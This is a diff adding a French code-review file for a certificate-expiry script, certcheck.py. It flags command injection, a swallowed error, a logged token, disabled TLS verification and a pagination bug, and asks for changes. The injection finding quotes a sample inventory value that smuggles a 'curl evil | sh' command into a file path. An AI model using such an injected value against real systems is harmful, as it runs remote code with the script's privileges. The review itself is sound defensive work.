@@ -1,0 +1,27 @@
+commentaires:
+  - fichier: certcheck.py
+    ligne: 78
+    categorie: injection-de-commande
+    commentaire: "Le chemin du certificat vient de l'inventaire et part dans une chaîne passée à un shell (shell=True) : une ligne d'inventaire comme « web-04 certs/x.pem;curl${IFS}evil|sh » exécute du code avec les droits du cron."
+    proposition: "Revenir à la liste d'arguments sans shell : subprocess.run([\"openssl\", \"x509\", \"-enddate\", \"-noout\", \"-in\", str(certificat)]). Pour ~, appeler Path(chemin).expanduser() dans lire_inventaire."
+  - fichier: certcheck.py
+    ligne: 116
+    categorie: erreur-avalee
+    commentaire: "Un certificat absent ou illisible disparaît du résultat, journalisé en debug seulement : le contrôle sort en 0 et un hôte dont on ne sait rien passe pour sain. C'est le défaut du script hérité que la reprise avait corrigé."
+    proposition: "Garder l'entrée en status error et le code 2 ; si un hôte est décommissionné, le retirer de l'inventaire. Rétablir le test test_un_certificat_absent_rend_error."
+  - fichier: certcheck.py
+    ligne: 161
+    categorie: secret-expose
+    commentaire: "Avec --verbose, désormais au niveau DEBUG, cette ligne écrit les en-têtes de chaque requête, donc Authorization: token <jeton>, sur la sortie d'erreur : le jeton de la forge finit dans le courriel du cron."
+    proposition: "Ne journaliser que la méthode et l'URL, jamais les en-têtes ; si besoin, une copie des en-têtes où Authorization est remplacé par « *** »."
+  - fichier: certcheck.py
+    ligne: 40
+    categorie: tls-desactive
+    commentaire: "ssl._create_unverified_context() coupe la vérification du certificat de la forge : n'importe qui sur le chemin réseau peut se faire passer pour elle et recevoir le jeton envoyé dans l'en-tête."
+    proposition: "Construire le contexte avec ssl.create_default_context(cafile=...) sur le certificat de l'AC de l'équipe, lu dans une variable comme CERTCHECK_CA_BUNDLE, ou installer l'AC dans le magasin du système."
+  - fichier: certcheck.py
+    ligne: 181
+    categorie: non-idempotent
+    commentaire: "ticket_ouvert ne lit plus que la première page (30 tickets par défaut sur Forgejo) : dès que le ticket de certcheck passe en deuxième page, chaque nuit en ouvre un doublon."
+    proposition: "Rétablir la boucle sur les pages, avec limit=50 et arrêt sur une page incomplète ou vide, et un test contre une forge factice qui place le ticket en deuxième page."
+verdict: demander-des-changements
